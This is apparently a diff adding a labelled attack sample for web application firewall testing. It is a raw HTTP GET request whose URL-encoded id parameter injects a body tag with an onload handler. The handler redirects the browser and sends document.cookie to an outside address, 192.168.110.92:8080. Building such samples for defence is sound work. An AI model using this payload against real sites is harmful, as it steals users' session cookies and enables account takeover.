@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_body标签_onload事件-06506577
+# 攻击载荷利用了HTML中的body标签和onload属性，触发location.href向恶意地址发送cookie信息。
+GET /?id=%3Cbody%20onload=%28location.href=%22http:%2F%2F192.168.110.92:8080%2Findex.jsp%3Fid=%22+document.cookie%29%3E&bid=hd_tag_m8mv2688 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv2688
+RM-PRO-Token: 3a6935d589e74ed2fa17bef94631eb0f
+RM-PRO-Time: 1742808554122
+User-Agent: curl/7.83.1
+
